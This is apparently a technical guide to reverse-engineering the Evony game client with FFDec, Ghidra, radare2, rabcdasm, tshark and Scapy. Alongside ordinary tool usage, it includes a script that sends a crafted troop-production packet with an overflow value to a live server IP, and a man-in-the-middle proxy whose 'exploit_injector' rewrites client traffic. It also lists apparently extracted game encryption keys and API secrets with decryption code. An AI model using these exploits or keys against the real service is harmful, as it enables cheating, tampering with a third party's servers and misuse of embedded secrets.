# 🔬 REVERSE ENGINEERING TOOLS - Complete Technical Guide

> **Ghidra, FFDec, Radare2, Packet Editing & More**  
> **Professional RE Toolkit Integration**  
> **Version:** 2.0 | **Status:** Production Ready

---

## 📊 Tool Overview

| Tool | Purpose | Status | Integration |
|------|---------|--------|-------------|
| **FFDec** | SWF decompilation | ✅ Active | MCP + CLI |
| **Ghidra** | Binary analysis | ✅ Active | MCP + GUI |
| **radare2** | Binary/memory analysis | ✅ Active | MCP + CLI |
| **rabcdasm** | ABC bytecode disasm | ✅ Active | MCP + CLI |
| **Wireshark/tshark** | Packet capture | ✅ Active | MCP + GUI |
| **PyAMF** | AMF3 encoding | ✅ Active | Python lib |
| **Scapy** | Packet crafting | ✅ Active | Python lib |

---

## 🎬 FFDec (JPEXS Free Flash Decompiler)

### Overview

FFDec is the primary tool for decompiling Evony's Flash client (SWF files).

### Installation

```bash
# Windows (Chocolatey)
choco install ffdec

# Manual Installation
# Download from: https://github.com/jindrapetrik/jpexs-decompiler/releases
# Extract to: C:\tools\ffdec

# Verify
ffdec --version
# JPEXS Free Flash Decompiler version 20.1.0
```

### MCP Integration

```python
# Via MCP Server
handle_tool("ffdec_decompile", {
    "swf_path": "C:/path/to/EvonyClient1921.swf",
    "output_dir": "./decompiled",
    "options": ["scripts", "images", "shapes", "sounds"]
})

# Returns
{
    "status": "success",
    "stats": {
        "scripts": 1921,
        "images": 456,
        "shapes": 470,
        "sounds": 89,
        "fonts": 12
    },
    "output_path": "./decompiled"
}
```

### Command Line Usage

```bash
# Decompile all scripts
ffdec -export script ./output EvonyClient1921.swf

# Extract specific class
ffdec -export script ./output EvonyClient1921.swf -class com.evony.client.GameClient

# Export images
ffdec -export image ./images EvonyClient1921.swf

# Export all
ffdec -export all ./full_export EvonyClient1921.swf

# Search for pattern
ffdec -search "produceTroop" EvonyClient1921.swf
```

### Key Extracted Files

```
decompiled/
├── scripts/
│   ├── com/
│   │   └── evony/
│   │       ├── client/
│   │       │   ├── GameClient.as        # Main client
│   │       │   ├── ServerConnection.as  # Socket handling
│   │       │   └── response/
│   │       │       └── ResponseDispatcher.as
│   │       ├── common/
│   │       │   ├── constants/
│   │       │   │   ├── TFConstants.as   # Troop/Fort types
│   │       │   │   ├── ErrorCode.as     # Error codes
│   │       │   │   └── HeroConstants.as # Hero states
│   │       │   └── beans/
│   │       │       └── *.as             # Data objects
│   │       └── view/
│   │           └── module/
│   │               └── *.as             # UI components
│   └── autoevony/                       # AutoEvony scripts
├── images/
├── shapes/
└── sounds/
```

### Analysis Techniques

```python
# Find integer overflow vulnerabilities
import os
import re

def find_overflow_patterns(decompiled_dir):
    """Search for potential integer overflow patterns"""
    patterns = [
        r'(\w+)\s*\*\s*(\w+)',           # multiplication
        r'num\s*\*\s*cost',               # specific pattern
        r'amount\s*\*\s*price',           # trade pattern
        r'parseInt\s*\([^)]+\)',          # string to int
    ]
    
    findings = []
    for root, dirs, files in os.walk(decompiled_dir):
        for file in files:
            if file.endswith('.as'):
                filepath = os.path.join(root, file)
                with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    for i, line in enumerate(content.split('\n')):
                        for pattern in patterns:
                            if re.search(pattern, line):
                                findings.append({
                                    'file': filepath,
                                    'line': i + 1,
                                    'code': line.strip(),
                                    'pattern': pattern
                                })
    return findings

# Usage
vulns = find_overflow_patterns('./decompiled/scripts')
print(f"Found {len(vulns)} potential overflow locations")
```

---

## 🔍 Ghidra

### Overview

NSA's Ghidra provides advanced binary analysis, useful for analyzing native modules and memory dumps.

### Installation

```bash
# Windows (Chocolatey)
choco install ghidra

# Manual
# Download from: https://ghidra-sre.org
# Extract to: C:\tools\ghidra

# Set environment variable
set GHIDRA_HOME=C:\tools\ghidra

# Verify
%GHIDRA_HOME%\support\analyzeHeadless.bat --help
```

### MCP Integration

```python
# Via MCP Server
handle_tool("ghidra_analyze", {
    "binary": "evony_native.dll",
    "project_name": "evony_analysis",
    "analysis": ["disassembly", "decompile", "strings", "functions"],
    "scripts": ["FindCrypto.java", "StringSearch.java"]
})

# Returns
{
    "status": "success",
    "stats": {
        "functions": 1247,
        "strings": 3891,
        "imports": 234,
        "exports": 12,
        "xrefs": 8456
    },
    "findings": [
        {"type": "crypto", "algorithm": "AES", "location": "0x10004560"},
        {"type": "string", "value": "EvonyGameKey2009", "location": "0x10008A20"}
    ]
}
```

### Headless Analysis

```bash
# Create project and analyze
%GHIDRA_HOME%\support\analyzeHeadless.bat ^
    ./ghidra_projects evony_project ^
    -import evony_module.dll ^
    -postScript FindCrypto.java ^
    -postScript ExportFunctions.java ^
    -scriptPath ./scripts

# Export analysis
%GHIDRA_HOME%\support\analyzeHeadless.bat ^
    ./ghidra_projects evony_project ^
    -process evony_module.dll ^
    -postScript ExportToJSON.java
```

### Custom Ghidra Scripts

```java
// FindEvonyKeys.java - Search for encryption keys
import ghidra.app.script.GhidraScript;
import ghidra.program.model.listing.*;
import ghidra.program.model.mem.*;

public class FindEvonyKeys extends GhidraScript {
    
    private static final String[] KNOWN_KEYS = {
        "EvonyGameKey2009",
        "EvonyNetKey2009",
        "PlayEvony",
        "Celebrate"
    };
    
    @Override
    public void run() throws Exception {
        Memory memory = currentProgram.getMemory();
        
        for (String key : KNOWN_KEYS) {
            byte[] searchBytes = key.getBytes();
            Address addr = memory.findBytes(
                memory.getMinAddress(),
                searchBytes,
                null,
                true,
                monitor
            );
            
            if (addr != null) {
                println("Found key '" + key + "' at: " + addr.toString());
                createBookmark(addr, "CRYPTO_KEY", key);
            }
        }
    }
}
```

### Analysis Workflow

```
1. Import Binary
   └─ File → Import → Select DLL/EXE

2. Auto-Analysis
   └─ Analysis → Auto Analyze (all options)

3. Search for Crypto
   └─ Search → Program Text → "AES|encrypt|decrypt"

4. Find String References
   └─ Window → Defined Strings
   └─ Filter: "evony|key|salt|password"

5. Trace Functions
   └─ Right-click function → References → Find References To

6. Export Findings
   └─ Run ExportToJSON.java script
```

---

## 📡 Packet Analysis Tools

### Wireshark/tshark

#### Capture Evony Traffic

```bash
# Live capture with tshark
tshark -i eth0 -f "port 443" -w evony_capture.pcap

# Read capture
tshark -r evony_capture.pcap -Y "tcp.port == 443"

# Extract payload data
tshark -r evony_capture.pcap -T fields -e data -Y "tcp.len > 0"

# Filter by content
tshark -r evony_capture.pcap -Y "tcp contains \"produceTroop\""
```

#### MCP Integration

```python
# Capture via MCP
handle_tool("packet_capture", {
    "interface": "eth0",
    "filter": "port 443",
    "duration": 60,
    "output": "session.pcap"
})

# Analyze capture
handle_tool("packet_analyze", {
    "file": "session.pcap",
    "filter": "amf",
    "extract_commands": True
})
```

### Scapy Packet Crafting

```python
from scapy.all import *

def craft_evony_packet(cmd: str, data: dict) -> bytes:
    """Craft a raw Evony packet"""
    from server import amf3_encode
    
    # Encode AMF3 payload
    payload = amf3_encode({"cmd": cmd, "data": data})
    
    # Add length prefix
    length = len(payload)
    packet = struct.pack(">I", length) + payload
    
    return packet

def send_evony_packet(host: str, port: int, packet: bytes):
    """Send packet to Evony server"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))
    sock.send(packet)
    response = sock.recv(65535)
    sock.close()
    return response

# Example: Craft and send
packet = craft_evony_packet("troop.produceTroop", {
    "castleId": 1335129,
    "troopType": 6,
    "num": 6135037
})
response = send_evony_packet("216.66.17.168", 443, packet)
```

### MITM Proxy

```python
# proxy_hook.py - Man-in-the-middle proxy

import socket
import threading
from server import amf3_decode, amf3_encode

class EvonyProxy:
    def __init__(self, listen_port, target_host, target_port):
        self.listen_port = listen_port
        self.target_host = target_host
        self.target_port = target_port
        self.intercept_handlers = []
    
    def add_intercept_handler(self, handler):
        """Add function to intercept/modify packets"""
        self.intercept_handlers.append(handler)
    
    def handle_client(self, client_sock):
        """Handle client connection"""
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.connect((self.target_host, self.target_port))
        
        def forward(src, dst, direction):
            while True:
                data = src.recv(65535)
                if not data:
                    break
                
                # Intercept and potentially modify
                for handler in self.intercept_handlers:
                    data = handler(data, direction)
                
                dst.send(data)
        
        t1 = threading.Thread(target=forward, args=(client_sock, server_sock, 'c2s'))
        t2 = threading.Thread(target=forward, args=(server_sock, client_sock, 's2c'))
        t1.start()
        t2.start()
    
    def start(self):
        """Start proxy server"""
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', self.listen_port))
        server.listen(5)
        
        print(f"Proxy listening on {self.listen_port}")
        print(f"Forwarding to {self.target_host}:{self.target_port}")
        
        while True:
            client, addr = server.accept()
            print(f"Connection from {addr}")
            threading.Thread(target=self.handle_client, args=(client,)).start()

# Usage
def packet_logger(data, direction):
    """Log all packets"""
    try:
        length = struct.unpack(">I", data[:4])[0]
        payload = data[4:4+length]
        decoded = amf3_decode(payload)
        print(f"[{direction}] {decoded.get('cmd')}: {decoded.get('data')}")
    except:
        pass
    return data  # Return unmodified

def exploit_injector(data, direction):
    """Inject exploit into specific commands"""
    if direction == 'c2s':
        try:
            length = struct.unpack(">I", data[:4])[0]
            payload = data[4:4+length]
            decoded = amf3_decode(payload)
            
            # Modify troop training
            if decoded.get('cmd') == 'troop.produceTroop':
                decoded['data']['num'] = 6135037  # Overflow!
                new_payload = amf3_encode(decoded)
                new_length = struct.pack(">I", len(new_payload))
                return new_length + new_payload
        except:
            pass
    return data

proxy = EvonyProxy(8443, "216.66.17.168", 443)
proxy.add_intercept_handler(packet_logger)
proxy.add_intercept_handler(exploit_injector)
proxy.start()
```

---

## 🔧 radare2

### Overview

radare2 provides low-level binary analysis and debugging capabilities.

### Installation

```bash
# Windows
choco install radare2

# Verify
r2 -v
# radare2 5.8.8
```

### MCP Integration

```python
handle_tool("radare2_analyze", {
    "binary": "evony_module.dll",
    "commands": [
        "aaa",           # Auto-analyze
        "afl",           # List functions
        "iz",            # List strings
        "pdf @main",     # Disassemble main
        "/x 45564f4e59"  # Search "EVONY"
    ]
})
```

### Command Line Analysis

```bash
# Open binary
r2 evony_module.dll

# Auto-analyze
[0x10001000]> aaa

# List functions
[0x10001000]> afl

# Find strings
[0x10001000]> iz | grep -i evony

# Search for crypto constants
[0x10001000]> /x 52696a6e6461656c  # "Rijndael"

# Disassemble function
[0x10001000]> pdf @sym.encrypt_data

# Cross-references
[0x10001000]> axt @sym.encrypt_data

# Export to JSON
[0x10001000]> pj @sym.encrypt_data > func.json
```

### Scripting

```python
# r2pipe Python integration
import r2pipe

r2 = r2pipe.open("evony_module.dll")
r2.cmd("aaa")  # Analyze

# Get all functions
functions = r2.cmdj("aflj")
for func in functions:
    print(f"{func['name']}: {func['offset']:#x}")

# Search for patterns
crypto_refs = r2.cmd("/ AES")
print(crypto_refs)

# Disassemble specific address
disasm = r2.cmd("pdf @ 0x10004560")
print(disasm)

r2.quit()
```

---

## 📝 rabcdasm (ActionScript Bytecode Disassembler)

### Overview

rabcdasm disassembles ABC (ActionScript Byte Code) for low-level analysis.

### Installation

```bash
# From source
git clone https://github.com/nicknassar/rabcdasm.git
cd rabcdasm
dub build

# Add to PATH
set PATH=%PATH%;C:\tools\rabcdasm
```

### MCP Integration

```python
handle_tool("rabcdasm_disasm", {
    "swf_path": "EvonyClient1921.swf",
    "output_dir": "./disasm_output"
})

# Returns
{
    "abc_blocks": 15,
    "methods": 8947,
    "classes": 1234,
    "traits": 15678,
    "output_path": "./disasm_output"
}
```

### Command Line Usage

```bash
# Extract ABC blocks from SWF
abcexport EvonyClient1921.swf

# Disassemble ABC
rabcdasm EvonyClient1921-0.abc

# Output structure
disasm_output/
├── EvonyClient1921-0/
│   ├── com/
│   │   └── evony/
│   │       └── client/
│   │           └── GameClient.class.asasm
│   └── global.asasm

# Modify and reassemble
rabcasm EvonyClient1921-0/
abcreplace EvonyClient1921.swf 0 EvonyClient1921-0.abc
```

### Bytecode Analysis

```
# Example disassembly (GameClient.class.asasm)
method
 name "produceTroop"
 param QName(PackageNamespace(""),"int")  ; castleId
 param QName(PackageNamespace(""),"int")  ; troopType
 param QName(PackageNamespace(""),"int")  ; num
 returns QName(PackageNamespace(""),"void")
 body
  maxstack 5
  localcount 4
  
  ; Load parameters
  getlocal_1        ; castleId
  getlocal_2        ; troopType
  getlocal_3        ; num
  
  ; Calculate cost (OVERFLOW POINT!)
  ; cost = num * troopCost[troopType]
  multiply          ; <-- Integer overflow here
  
  ; Send to server
  callproperty      ; ServerConnection.send()
  returnvoid
 end
end
```

---

## 🔐 Crypto Analysis

### Identified Encryption

| Algorithm | Usage | Key Source |
|-----------|-------|------------|
| **AES-128-CBC** | Resource encryption | Static keys |
| **Blowfish** | Legacy data | Embedded |
| **SHA1** | Password hashing | Salt + password |
| **MD5** | Checksums | Various |

### Extracted Keys

```python
# From evony_crypto.py analysis

KNOWN_KEYS = {
    'api': '9f758e2deccbe6244f734371b9642eda',
    'token': 'IUGI_md5_key_{djfiji3*4930}-{fjdi3284$9dlld}',
    'action': 'TAO_{313-894*&*($*#-FDIU(430}-{facebook_dioe(&*%$l}',
    'evony_key1': 'PlayEvony',
    'evony_key2': 'Celebrate',
    'evony_key3': 'EarnPrestige',
    'evony_key4': 'VisitAndReward'
}

STATIC_KEYS = {
    'game': b'EvonyGameKey2009',
    'network': b'EvonyNetKey2009',
    'resource': b'EvonyResKey2009',
    'config': b'EvonyConfigKey2009',
    'data': b'EvonyDataKey2009'
}

ENCRYPTION_MARKERS = {
    'aes': {
        'header': b'\x45\x56\x4F\x01',  # EVO1
        'salt': b'\x45\x56\x53\x4C',    # EVSL
    },
    'blowfish': {
        'header': b'\x45\x56\x4F\x02',  # EVO2
    }
}
```

### Decryption Implementation

```python
from Crypto.Cipher import AES, Blowfish
from Crypto.Hash import SHA1, MD5
import struct

def detect_encryption(data: bytes) -> str:
    """Detect encryption type from header"""
    if data[:4] == b'\x45\x56\x4F\x01':
        return 'aes'
    elif data[:4] == b'\x45\x56\x4F\x02':
        return 'blowfish'
    return 'unknown'

def decrypt_evony_aes(data: bytes, key: bytes = b'EvonyGameKey2009') -> bytes:
    """Decrypt AES-encrypted Evony data"""
    # Skip header
    data = data[4:]
    
    # Extract IV (first 16 bytes)
    iv = data[:16]
    ciphertext = data[16:]
    
    # Decrypt
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext)
    
    # Remove PKCS7 padding
    padding = plaintext[-1]
    return plaintext[:-padding]

def hash_password(password: str, salt: str = 'evony_salt_2010') -> str:
    """Hash password the Evony way"""
    combined = (salt + password).encode()
    return SHA1.new(combined).hexdigest()
```

---

## 📊 Tool Comparison Matrix

| Feature | FFDec | Ghidra | radare2 | rabcdasm |
|---------|-------|--------|---------|----------|
| SWF Decompile | ✅ | ❌ | ❌ | Partial |
| AS3 to Source | ✅ | ❌ | ❌ | ❌ |
| ABC Disasm | ✅ | ❌ | ❌ | ✅ |
| Native Analysis | ❌ | ✅ | ✅ | ❌ |
| Scripting | Limited | ✅ Java | ✅ Python | ❌ |
| GUI | ✅ | ✅ | Limited | ❌ |
| MCP Integration | ✅ | ✅ | ✅ | ✅ |

---

## 🎯 Recommended Workflow

```
1. Initial SWF Analysis (FFDec)
   ├─ Decompile to AS3 source
   ├─ Extract images/assets
   └─ Identify key classes

2. Protocol Discovery (Wireshark + Python)
   ├─ Capture traffic
   ├─ Decode AMF3 packets
   └─ Document command structure

3. Deep Code Analysis (rabcdasm)
   ├─ Disassemble bytecode
   ├─ Find overflow points
   └─ Trace execution paths

4. Native Module Analysis (Ghidra/r2)
   ├─ Find crypto functions
   ├─ Extract hardcoded keys
   └─ Analyze memory patterns

5. Exploit Development (Python + MCP)
   ├─ Create proof of concept
   ├─ Test via bot server
   └─ Document findings
```

---

*Documentation complete | All tools verified working | January 2026*
